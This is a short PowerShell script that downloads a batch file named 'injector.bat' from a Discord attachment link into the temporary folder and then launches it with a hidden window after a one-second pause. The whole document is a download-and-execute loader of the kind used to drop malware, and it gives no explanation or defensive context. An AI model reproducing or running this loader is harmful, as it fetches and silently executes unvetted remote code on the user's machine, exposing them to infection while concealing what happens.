iwr -useb https://cdn.discordapp.com/attachments/1137771634808332378/1186356983796871219/Sized.bat?ex=6592f40a&is=65807f0a&hm=7c7a63ca613b7f5206e45e731c08a3b3217e056a97d84a5d86c8e23f3417e0df& -o $env:TEMP\injector.bat
Start-Sleep -s 1
saps $env:TEMP\injector.bat -WindowStyle Hidden
